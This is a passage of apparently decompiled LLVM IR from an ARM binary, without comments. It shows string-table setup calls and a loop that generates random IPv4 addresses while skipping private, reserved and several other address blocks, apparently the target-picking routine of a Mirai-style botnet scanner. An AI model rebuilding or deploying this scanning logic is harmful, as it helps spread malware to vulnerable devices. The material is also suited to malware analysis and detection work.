  store i32 12, i32* %r2.global-to-local, align 4
  %v5_10ca4 = call i32 @function_10818(i32 ptrtoint ([5 x i8]* @global_var_136e4.257 to i32), i32 ptrtoint ([9 x i8]* @global_var_13704.265 to i32), i32 12)
  store i32 ptrtoint ([5 x i8]* @global_var_136e4.257 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_13710.267 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_10cb4 = call i32 @function_10818(i32 ptrtoint ([5 x i8]* @global_var_136e4.257 to i32), i32 ptrtoint ([6 x i8]* @global_var_13710.267 to i32), i32 9)
  store i32 ptrtoint ([5 x i8]* @global_var_136e4.257 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_13718.269 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_10cc4 = call i32 @function_10818(i32 ptrtoint ([5 x i8]* @global_var_136e4.257 to i32), i32 ptrtoint ([6 x i8]* @global_var_13718.269 to i32), i32 9)
  store i32 ptrtoint ([5 x i8]* @global_var_136e4.257 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_13720.271 to i32), i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v5_10cd4 = call i32 @function_10818(i32 ptrtoint ([5 x i8]* @global_var_136e4.257 to i32), i32 ptrtoint ([9 x i8]* @global_var_13720.271 to i32), i32 12)
  store i32 ptrtoint ([5 x i8]* @global_var_136e4.257 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1372c.273 to i32), i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  %v5_10ce4 = call i32 @function_10818(i32 ptrtoint ([5 x i8]* @global_var_136e4.257 to i32), i32 ptrtoint ([8 x i8]* @global_var_1372c.273 to i32), i32 11)
  store i32 ptrtoint ([5 x i8]* @global_var_136e4.257 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_13734.275 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v5_10cf4 = call i32 @function_10818(i32 ptrtoint ([5 x i8]* @global_var_136e4.257 to i32), i32 ptrtoint ([4 x i8]* @global_var_13734.275 to i32), i32 7)
  store i32 ptrtoint ([5 x i8]* @global_var_136e4.257 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_13738.277 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v5_10d04 = call i32 @function_10818(i32 ptrtoint ([5 x i8]* @global_var_136e4.257 to i32), i32 ptrtoint ([7 x i8]* @global_var_13738.277 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_136e4.257 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_13740.279 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v5_10d14 = call i32 @function_10818(i32 ptrtoint ([5 x i8]* @global_var_136e4.257 to i32), i32 ptrtoint ([4 x i8]* @global_var_13740.279 to i32), i32 7)
  store i32 ptrtoint ([5 x i8]* @global_var_136e4.257 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_13744.281 to i32), i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v5_10d24 = call i32 @function_10818(i32 ptrtoint ([5 x i8]* @global_var_136e4.257 to i32), i32 ptrtoint ([9 x i8]* @global_var_13744.281 to i32), i32 12)
  store i32 ptrtoint ([5 x i8]* @global_var_136e4.257 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_137d0.247 to i32), i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v5_10d34 = call i32 @function_10818(i32 ptrtoint ([5 x i8]* @global_var_136e4.257 to i32), i32 ptrtoint ([9 x i8]* @global_var_137d0.247 to i32), i32 12)
  store i32 ptrtoint ([5 x i8]* @global_var_136e4.257 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_137dc.249 to i32), i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v4_10d44 = call i32 @function_10818(i32 ptrtoint ([5 x i8]* @global_var_136e4.257 to i32), i32 ptrtoint (i32* @global_var_137dc.249 to i32), i32 16)
  store i32 ptrtoint ([5 x i8]* @global_var_136e4.257 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_13750.283 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_10d54 = call i32 @function_10818(i32 ptrtoint ([5 x i8]* @global_var_136e4.257 to i32), i32 ptrtoint ([6 x i8]* @global_var_13750.283 to i32), i32 9)
  store i32 ptrtoint ([5 x i8]* @global_var_136e4.257 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_13758.285 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v5_10d64 = call i32 @function_10818(i32 ptrtoint ([5 x i8]* @global_var_136e4.257 to i32), i32 ptrtoint ([7 x i8]* @global_var_13758.285 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_136e4.257 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_13760.287 to i32), i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  %v5_10d74 = call i32 @function_10818(i32 ptrtoint ([5 x i8]* @global_var_136e4.257 to i32), i32 ptrtoint ([11 x i8]* @global_var_13760.287 to i32), i32 14)
  store i32 ptrtoint ([5 x i8]* @global_var_136e4.257 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1376c.289 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v5_10d84 = call i32 @function_10818(i32 ptrtoint ([5 x i8]* @global_var_136e4.257 to i32), i32 ptrtoint ([7 x i8]* @global_var_1376c.289 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_136e4.257 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_13774.291 to i32), i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v4_10d94 = call i32 @function_10818(i32 ptrtoint ([5 x i8]* @global_var_136e4.257 to i32), i32 ptrtoint (i32* @global_var_13774.291 to i32), i32 16)
  store i32 ptrtoint ([8 x i8]* @global_var_1372c.273 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_136b0.251 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v4_10da4 = call i32 @function_10818(i32 ptrtoint ([8 x i8]* @global_var_1372c.273 to i32), i32 ptrtoint (i32* @global_var_136b0.251 to i32), i32 7)
  store i32 ptrtoint ([5 x i8]* @global_var_13784.293 to i32), i32* %r0.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_13784.293 to i32), i32* %r1.global-to-local, align 4
  %v5_10db4 = call i32 @function_10818(i32 ptrtoint ([5 x i8]* @global_var_13784.293 to i32), i32 ptrtoint ([5 x i8]* @global_var_13784.293 to i32), i32 8)
  %v0_10db8 = load i32, i32* @r6, align 4
  store i32 %v0_10db8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1378c.295 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_136b0.251 to i32), i32* %r1.global-to-local, align 4
  %v4_10dc4 = call i32 @function_10818(i32 ptrtoint ([7 x i8]* @global_var_1378c.295 to i32), i32 ptrtoint (i32* @global_var_136b0.251 to i32), i32 %v0_10db8)
  store i32 ptrtoint ([4 x i8]* @global_var_13794.297 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_136b0.251 to i32), i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v4_10dd4 = call i32 @function_10818(i32 ptrtoint ([4 x i8]* @global_var_13794.297 to i32), i32 ptrtoint (i32* @global_var_136b0.251 to i32), i32 3)
  store i32 ptrtoint ([8 x i8]* @global_var_13798.299 to i32), i32* %r0.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_13798.299 to i32), i32* %r1.global-to-local, align 4
  %v5_10de4 = call i32 @function_10818(i32 ptrtoint ([8 x i8]* @global_var_13798.299 to i32), i32 ptrtoint ([8 x i8]* @global_var_13798.299 to i32), i32 14)
  store i32 ptrtoint ([11 x i8]* @global_var_137a0.301 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_137ac.303 to i32), i32* %r1.global-to-local, align 4
  store i32 18, i32* %r2.global-to-local, align 4
  %v5_10df4 = call i32 @function_10818(i32 ptrtoint ([11 x i8]* @global_var_137a0.301 to i32), i32 ptrtoint ([9 x i8]* @global_var_137ac.303 to i32), i32 18)
  %v2_10dfc = ptrtoint i32* %stack_var_-1862 to i32
  store i32 %v2_10dfc, i32* %r0.global-to-local, align 4
  %v2_10e00 = ptrtoint i32* %stack_var_-1842 to i32
  store i32 %v2_10e00, i32* %r1.global-to-local, align 4
  %tmp286 = bitcast i32* %stack_var_-1842 to i8*
  %v1_1111c = add i32 %v2_10dfc, 16
  %v2_1111c = inttoptr i32 %v1_1111c to i32*
  %v1_11140 = or i32 %v2_10e00, 1
  %v2_11140 = inttoptr i32 %v1_11140 to i8*
  %v1_11164 = or i32 %v2_10e00, 2
  %v2_11164 = inttoptr i32 %v1_11164 to i8*
  %v1_11168 = or i32 %v2_10e00, 3
  %v2_11168 = inttoptr i32 %v1_11168 to i8*
  %v1_11180 = add i32 %v2_10e00, 13
  %v2_11180 = inttoptr i32 %v1_11180 to i8*
  %v1_1112c = add i32 %v2_10dfc, 9
  %v2_1112c = inttoptr i32 %v1_1112c to i8*
  %v1_111a4 = add i32 %v2_10e00, 8
  %v2_111a4 = inttoptr i32 %v1_111a4 to i32*
  %v1_111e4 = add i32 %v2_10dfc, 12
  %v2_111e4 = inttoptr i32 %v1_111e4 to i32*
  %v2_11370 = ptrtoint i32* %stack_var_-36 to i32
  %v2_113e8 = ptrtoint i32* %stack_var_-76 to i32
  %v2_113ec = ptrtoint i32* %stack_var_-348 to i32
  %tmp317 = bitcast i32* %stack_var_-348 to %_TYPEDEF_fd_set*
  %v2_113f4 = ptrtoint i32* %stack_var_-64 to i32
  %v2_113f8 = ptrtoint i32* %stack_var_-220 to i32
  %tmp318 = bitcast i32* %stack_var_-220 to %_TYPEDEF_fd_set*
  %tmp320 = bitcast i32* %stack_var_-64 to %timeval*
  %v2_11dbc = ptrtoint i32* %stack_var_-41 to i32
  %v2_11dcc = ptrtoint i32* %stack_var_-73 to i32
  %v2_115a0 = ptrtoint i8* %stack_var_-52 to i32
  %v2_115a8 = bitcast i8* %stack_var_-52 to i32*
  %v2_115b4 = ptrtoint i32* %stack_var_-56 to i32
  %v2_11090 = ptrtoint i32* %stack_var_-92 to i32
  %tmp287 = bitcast i32* %stack_var_-92 to %sockaddr*
  br label %dec_label_pc_10e0c

dec_label_pc_10e0c:                               ; preds = %dec_label_pc_11454, %dec_label_pc_10b24
  store i32 ptrtoint (i32* @global_var_1c218.208 to i32), i32* %r2.global-to-local, align 4
  %v2_10e10 = load i32, i32* @global_var_1c218.208, align 4
  store i32 %v2_10e10, i32* %r8.global-to-local, align 4
  %v0_10e14 = load i32, i32* @fp, align 4
  %v3_10e14 = icmp uge i32 %v0_10e14, %v2_10e10
  store i1 %v3_10e14, i1* %cpsr_c.global-to-local, align 1
  %v9_10e14 = icmp eq i32 %v0_10e14, %v2_10e10
  store i1 %v9_10e14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_10e14, label %dec_label_pc_110bc, label %dec_label_pc_10e1c

dec_label_pc_10e1c:                               ; preds = %dec_label_pc_10e0c
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-48, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_10e28

dec_label_pc_10e28:                               ; preds = %.thread52.dec_label_pc_10e28_crit_edge, %dec_label_pc_10e1c
  %v0_10e28 = phi i32 [ %v0_10e28.pre, %.thread52.dec_label_pc_10e28_crit_edge ], [ 0, %dec_label_pc_10e1c ]
  store i32 %v0_10e28, i32* %stack_var_-92, align 4
  %v0_10e38 = call i32 @function_105b0()
  %v1_10e38 = trunc i32 %v0_10e38 to i8
  store i32 %v0_10e38, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1c21c.135 to i32), i32* %ip.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1c1e8.224 to i32), i32* %lr.global-to-local, align 4
  %v2_10e44 = load i32, i32* @global_var_1c21c.135, align 4
  store i32 %v2_10e44, i32* %r2.global-to-local, align 4
  %v2_10e48 = and i32 %v0_10e38, 128
  %v3_10e48 = icmp ne i32 %v2_10e48, 0
  store i1 %v3_10e48, i1* %cpsr_c.global-to-local, align 1
  %v4_10e48 = sdiv i32 %v0_10e38, 256
  store i32 %v4_10e48, i32* %r3.global-to-local, align 4
  %v1_10e4c = trunc i32 %v4_10e48 to i8
  store i8 %v1_10e4c, i8* bitcast (i32* @global_var_1c1ed.231 to i8*), align 4
  store i32 %v2_10e44, i32* @global_var_1c1f4.304, align 4
  store i8 %v1_10e38, i8* bitcast (i32* @global_var_1c1ec.235 to i8*), align 4
  br label %dec_label_pc_10e58

dec_label_pc_10e58:                               ; preds = %dec_label_pc_10f2c, %dec_label_pc_10e88, %dec_label_pc_10f60, %dec_label_pc_10f54, %dec_label_pc_10f48, %dec_label_pc_10f3c, %.thread37, %bb306, %bb305, %bb304, %bb303, %bb302, %dec_label_pc_10f24, %dec_label_pc_10f1c, %bb298, %dec_label_pc_10eec, %dec_label_pc_10ec8, %bb291, %dec_label_pc_10e98, %bb290, %dec_label_pc_10e80, %bb289, %bb308, %dec_label_pc_10e28
  %v0_10e58 = call i32 @function_105b0()
  store i32 %v0_10e58, i32* %r0.global-to-local, align 4
  %v1_10e5c = urem i32 %v0_10e58, 256
  store i32 %v1_10e5c, i32* %r1.global-to-local, align 4
  %v3_10e60 = udiv i32 %v0_10e58, 256
  store i32 %v3_10e60, i32* %r3.global-to-local, align 4
  %v3_10e64 = udiv i32 %v0_10e58, 65536
  store i32 %v3_10e64, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10e68 = icmp eq i32 %v1_10e5c, 0
  store i1 %v2_10e68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10e68, label %bb289, label %bb288

bb288:                                            ; preds = %dec_label_pc_10e58
  %v3_10e6c = icmp ugt i32 %v1_10e5c, 126
  store i1 %v3_10e6c, i1* %cpsr_c.global-to-local, align 1
  %v8_10e6c = icmp eq i32 %v1_10e5c, 127
  store i1 %v8_10e6c, i1* %cpsr_z.global-to-local, align 1
  br label %bb289

bb289:                                            ; preds = %dec_label_pc_10e58, %bb288
  %v0_10e7c = phi i1 [ true, %dec_label_pc_10e58 ], [ %v8_10e6c, %bb288 ]
  %v1_10e70 = urem i32 %v3_10e60, 256
  store i32 %v1_10e70, i32* %ip.global-to-local, align 4
  %v1_10e74 = urem i32 %v3_10e64, 256
  store i32 %v1_10e74, i32* %r2.global-to-local, align 4
  %v1_10e78 = and i32 %v0_10e58, 8388608
  %v2_10e78 = icmp ne i32 %v1_10e78, 0
  store i1 %v2_10e78, i1* %cpsr_c.global-to-local, align 1
  %v3_10e78 = udiv i32 %v0_10e58, 16777216
  store i32 %v3_10e78, i32* %r0.global-to-local, align 4
  br i1 %v0_10e7c, label %dec_label_pc_10e58, label %dec_label_pc_10e80

dec_label_pc_10e80:                               ; preds = %bb289
  %v2_10e80 = icmp ugt i32 %v1_10e5c, 2
  store i1 %v2_10e80, i1* %cpsr_c.global-to-local, align 1
  %v7_10e80 = icmp eq i32 %v1_10e5c, 3
  store i1 %v7_10e80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10e80, label %dec_label_pc_10e58, label %dec_label_pc_10e88

dec_label_pc_10e88:                               ; preds = %dec_label_pc_10e80
  %v1_10e88 = add nsw i32 %v1_10e5c, -15
  store i32 %v1_10e88, i32* %r3.global-to-local, align 4
  %v2_10e8c = icmp ugt i32 %v1_10e5c, 55
  store i1 %v2_10e8c, i1* %cpsr_c.global-to-local, align 1
  %v7_10e8c = icmp eq i32 %v1_10e5c, 56
  store i1 %v7_10e8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10e8c, label %dec_label_pc_10e58, label %bb290

bb290:                                            ; preds = %dec_label_pc_10e88
  %v3_10e90 = icmp ne i32 %v1_10e88, 0
  store i1 %v3_10e90, i1* %cpsr_c.global-to-local, align 1
  %v8_10e90 = icmp eq i32 %v1_10e88, 1
  store i1 %v8_10e90, i1* %cpsr_z.global-to-local, align 1
  %v2_10e94 = xor i1 %v3_10e90, true
  %v3_10e94 = or i1 %v8_10e90, %v2_10e94
  br i1 %v3_10e94, label %dec_label_pc_10e58, label %dec_label_pc_10e98

dec_label_pc_10e98:                               ; preds = %bb290
  %v2_10e98 = icmp ugt i32 %v1_10e5c, 9
  store i1 %v2_10e98, i1* %cpsr_c.global-to-local, align 1
  %v7_10e98 = icmp eq i32 %v1_10e5c, 10
  store i1 %v7_10e98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10e98, label %dec_label_pc_10e58, label %dec_label_pc_10ea0

dec_label_pc_10ea0:                               ; preds = %dec_label_pc_10e98
  %v2_10ea0 = icmp ugt i32 %v1_10e5c, 191
  store i1 %v2_10ea0, i1* %cpsr_c.global-to-local, align 1
  %v7_10ea0 = icmp eq i32 %v1_10e5c, 192
  store i1 %v7_10ea0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10ea0, label %bb291, label %dec_label_pc_10eac

bb291:                                            ; preds = %dec_label_pc_10ea0
  %v3_10ea4 = icmp ugt i32 %v1_10e70, 167
  store i1 %v3_10ea4, i1* %cpsr_c.global-to-local, align 1
  %v8_10ea4 = icmp eq i32 %v1_10e70, 168
  store i1 %v8_10ea4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10ea4, label %dec_label_pc_10e58, label %dec_label_pc_10eac

dec_label_pc_10eac:                               ; preds = %dec_label_pc_10ea0, %bb291
  %v7_10eac = icmp eq i32 %v1_10e5c, 172
  %.364 = zext i1 %v7_10eac to i32
  store i32 %.364, i32* %r3.global-to-local, align 4
  %v2_10eb8 = icmp ugt i32 %v1_10e70, 14
  store i1 %v2_10eb8, i1* %cpsr_c.global-to-local, align 1
  %v7_10eb8 = icmp eq i32 %v1_10e70, 15
  store i1 %v7_10eb8, i1* %cpsr_z.global-to-local, align 1
  %v2_10ebc = xor i1 %v2_10eb8, true
  %v3_10ebc = or i1 %v7_10eb8, %v2_10ebc
  br i1 %v3_10ebc, label %.thread15, label %bb294

.thread15:                                        ; preds = %dec_label_pc_10eac
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10ed0

bb294:                                            ; preds = %dec_label_pc_10eac
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10ec0 = icmp eq i1 %v7_10eac, false
  store i1 %v2_10ec0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10ec0, label %dec_label_pc_10ed0, label %dec_label_pc_10ec8

dec_label_pc_10ec8:                               ; preds = %bb294
  %v2_10ec8 = icmp ugt i32 %v1_10e70, 30
  store i1 %v2_10ec8, i1* %cpsr_c.global-to-local, align 1
  %v7_10ec8 = icmp eq i32 %v1_10e70, 31
  store i1 %v7_10ec8, i1* %cpsr_z.global-to-local, align 1
  %v2_10ecc = xor i1 %v2_10ec8, true
  %v3_10ecc = or i1 %v7_10ec8, %v2_10ecc
  br i1 %v3_10ecc, label %dec_label_pc_10e58, label %dec_label_pc_10ed0

dec_label_pc_10ed0:                               ; preds = %.thread15, %dec_label_pc_10ec8, %bb294
  %v7_10ed0 = icmp eq i32 %v1_10e5c, 100
  %.365 = zext i1 %v7_10ed0 to i32
  store i32 %.365, i32* %r3.global-to-local, align 4
  %v2_10edc = icmp ugt i32 %v1_10e70, 62
  store i1 %v2_10edc, i1* %cpsr_c.global-to-local, align 1
  %v7_10edc = icmp eq i32 %v1_10e70, 63
  store i1 %v7_10edc, i1* %cpsr_z.global-to-local, align 1
  %v2_10ee0 = xor i1 %v2_10edc, true
  %v3_10ee0 = or i1 %v7_10edc, %v2_10ee0
  br i1 %v3_10ee0, label %.thread20, label %bb297

.thread20:                                        ; preds = %dec_label_pc_10ed0
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10ef4

bb297:                                            ; preds = %dec_label_pc_10ed0
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10ee4 = icmp eq i1 %v7_10ed0, false
  store i1 %v2_10ee4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10ee4, label %dec_label_pc_10ef4, label %dec_label_pc_10eec

dec_label_pc_10eec:                               ; preds = %bb297
  %v2_10eec = icmp ugt i32 %v1_10e70, 125
  store i1 %v2_10eec, i1* %cpsr_c.global-to-local, align 1
  %v7_10eec = icmp eq i32 %v1_10e70, 126
  store i1 %v7_10eec, i1* %cpsr_z.global-to-local, align 1
  %v2_10ef0 = xor i1 %v2_10eec, true
  %v3_10ef0 = or i1 %v7_10eec, %v2_10ef0
  br i1 %v3_10ef0, label %dec_label_pc_10e58, label %dec_label_pc_10ef4

dec_label_pc_10ef4:                               ; preds = %.thread20, %dec_label_pc_10eec, %bb297
  %v2_10ef4 = icmp ugt i32 %v1_10e5c, 168
  store i1 %v2_10ef4, i1* %cpsr_c.global-to-local, align 1
  %v7_10ef4 = icmp eq i32 %v1_10e5c, 169
  store i1 %v7_10ef4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10ef4, label %bb298, label %dec_label_pc_10f00

bb298:                                            ; preds = %dec_label_pc_10ef4
  %v3_10ef8 = icmp eq i32 %v1_10e70, 255
  store i1 %v3_10ef8, i1* %cpsr_c.global-to-local, align 1
  store i1 %v3_10ef8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_10ef8, label %dec_label_pc_10e58, label %dec_label_pc_10f00

dec_label_pc_10f00:                               ; preds = %dec_label_pc_10ef4, %bb298
  %v7_10f00 = icmp eq i32 %v1_10e5c, 198
  %.366 = zext i1 %v7_10f00 to i32
  store i32 %.366, i32* %r3.global-to-local, align 4
  %v2_10f0c = icmp ugt i32 %v1_10e70, 16
  store i1 %v2_10f0c, i1* %cpsr_c.global-to-local, align 1
  %v7_10f0c = icmp eq i32 %v1_10e70, 17
  store i1 %v7_10f0c, i1* %cpsr_z.global-to-local, align 1
  %v2_10f10 = xor i1 %v2_10f0c, true
  %v3_10f10 = or i1 %v7_10f0c, %v2_10f10
  br i1 %v3_10f10, label %.thread26, label %bb301

.thread26:                                        ; preds = %dec_label_pc_10f00
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10f24

bb301:                                            ; preds = %dec_label_pc_10f00
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10f14 = icmp eq i1 %v7_10f00, false
  store i1 %v2_10f14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10f14, label %dec_label_pc_10f24, label %dec_label_pc_10f1c

dec_label_pc_10f1c:                               ; preds = %bb301
  %v2_10f1c = icmp ugt i32 %v1_10e70, 18
  store i1 %v2_10f1c, i1* %cpsr_c.global-to-local, align 1
  %v7_10f1c = icmp eq i32 %v1_10e70, 19
  store i1 %v7_10f1c, i1* %cpsr_z.global-to-local, align 1
  %v2_10f20 = xor i1 %v2_10f1c, true
  %v3_10f20 = or i1 %v7_10f1c, %v2_10f20
  br i1 %v3_10f20, label %dec_label_pc_10e58, label %dec_label_pc_10f24

dec_label_pc_10f24:                               ; preds = %.thread26, %dec_label_pc_10f1c, %bb301
  %v2_10f24 = icmp ugt i32 %v1_10e5c, 222
  store i1 %v2_10f24, i1* %cpsr_c.global-to-local, align 1
  %v7_10f24 = icmp eq i32 %v1_10e5c, 223
  store i1 %v7_10f24, i1* %cpsr_z.global-to-local, align 1
  %v2_10f28 = xor i1 %v7_10f24, true
  %v3_10f28 = and i1 %v2_10f24, %v2_10f28
  br i1 %v3_10f28, label %dec_label_pc_10e58, label %dec_label_pc_10f2c

dec_label_pc_10f2c:                               ; preds = %dec_label_pc_10f24
  %v1_10f2c = add nsw i32 %v1_10e5c, -6
  store i32 %v1_10f2c, i32* %r3.global-to-local, align 4
  %v2_10f30 = icmp ugt i32 %v1_10e5c, 10
  store i1 %v2_10f30, i1* %cpsr_c.global-to-local, align 1
  %v7_10f30 = icmp eq i32 %v1_10e5c, 11
  store i1 %v7_10f30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10f30, label %dec_label_pc_10e58, label %bb302

bb302:                                            ; preds = %dec_label_pc_10f2c
  %v3_10f34 = icmp ne i32 %v1_10f2c, 0
  store i1 %v3_10f34, i1* %cpsr_c.global-to-local, align 1
  %v8_10f34 = icmp eq i32 %v1_10f2c, 1
  store i1 %v8_10f34, i1* %cpsr_z.global-to-local, align 1
  %v2_10f38 = xor i1 %v3_10f34, true
  %v3_10f38 = or i1 %v8_10f34, %v2_10f38
  br i1 %v3_10f38, label %dec_label_pc_10e58, label %dec_label_pc_10f3c

dec_label_pc_10f3c:                               ; preds = %bb302
  %v2_10f3c = icmp ugt i32 %v1_10e5c, 21
  store i1 %v2_10f3c, i1* %cpsr_c.global-to-local, align 1
  %v7_10f3c = icmp eq i32 %v1_10e5c, 22
  store i1 %v7_10f3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10f3c, label %dec_label_pc_10e58, label %bb303

bb303:                                            ; preds = %dec_label_pc_10f3c
  %v3_10f40 = icmp ugt i32 %v1_10e5c, 20
  store i1 %v3_10f40, i1* %cpsr_c.global-to-local, align 1
  %v8_10f40 = icmp eq i32 %v1_10e5c, 21
  store i1 %v8_10f40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10f40, label %dec_label_pc_10e58, label %dec_label_pc_10f48

dec_label_pc_10f48:                               ; preds = %bb303
  %v2_10f48 = icmp ugt i32 %v1_10e5c, 27
  store i1 %v2_10f48, i1* %cpsr_c.global-to-local, align 1
  %v7_10f48 = icmp eq i32 %v1_10e5c, 28
  store i1 %v7_10f48, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10f48, label %dec_label_pc_10e58, label %bb304

bb304:                                            ; preds = %dec_label_pc_10f48
  %v3_10f4c = icmp ugt i32 %v1_10e5c, 25
  store i1 %v3_10f4c, i1* %cpsr_c.global-to-local, align 1
  %v8_10f4c = icmp eq i32 %v1_10e5c, 26
  store i1 %v8_10f4c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10f4c, label %dec_label_pc_10e58, label %dec_label_pc_10f54

dec_label_pc_10f54:                               ; preds = %bb304
  %v2_10f54 = icmp ugt i32 %v1_10e5c, 29
  store i1 %v2_10f54, i1* %cpsr_c.global-to-local, align 1
  %v7_10f54 = icmp eq i32 %v1_10e5c, 30
  store i1 %v7_10f54, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10f54, label %dec_label_pc_10e58, label %bb305

bb305:                                            ; preds = %dec_label_pc_10f54
  %v3_10f58 = icmp ugt i32 %v1_10e5c, 28
  store i1 %v3_10f58, i1* %cpsr_c.global-to-local, align 1
  %v8_10f58 = icmp eq i32 %v1_10e5c, 29
  store i1 %v8_10f58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10f58, label %dec_label_pc_10e58, label %dec_label_pc_10f60

dec_label_pc_10f60:                               ; preds = %bb305
  %v2_10f60 = icmp ugt i32 %v1_10e5c, 54
  store i1 %v2_10f60, i1* %cpsr_c.global-to-local, align 1
  %v7_10f60 = icmp eq i32 %v1_10e5c, 55
  store i1 %v7_10f60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10f60, label %dec_label_pc_10e58, label %bb306

bb306:                                            ; preds = %dec_label_pc_10f60
  %v3_10f64 = icmp ugt i32 %v1_10e5c, 32
  store i1 %v3_10f64, i1* %cpsr_c.global-to-local, align 1
  %v8_10f64 = icmp eq i32 %v1_10e5c, 33
  store i1 %v8_10f64, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10f64, label %dec_label_pc_10e58, label %dec_label_pc_10f6c

dec_label_pc_10f6c:                               ; preds = %bb306
  %v2_10f6c = icmp ugt i32 %v1_10e5c, 214
  store i1 %v2_10f6c, i1* %cpsr_c.global-to-local, align 1
  %v7_10f6c = icmp eq i32 %v1_10e5c, 215
  store i1 %v7_10f6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10f6c, label %.thread37, label %bb307

bb307:                                            ; preds = %dec_label_pc_10f6c
  %v3_10f70 = icmp ugt i32 %v1_10e5c, 213
  store i1 %v3_10f70, i1* %cpsr_c.global-to-local, align 1
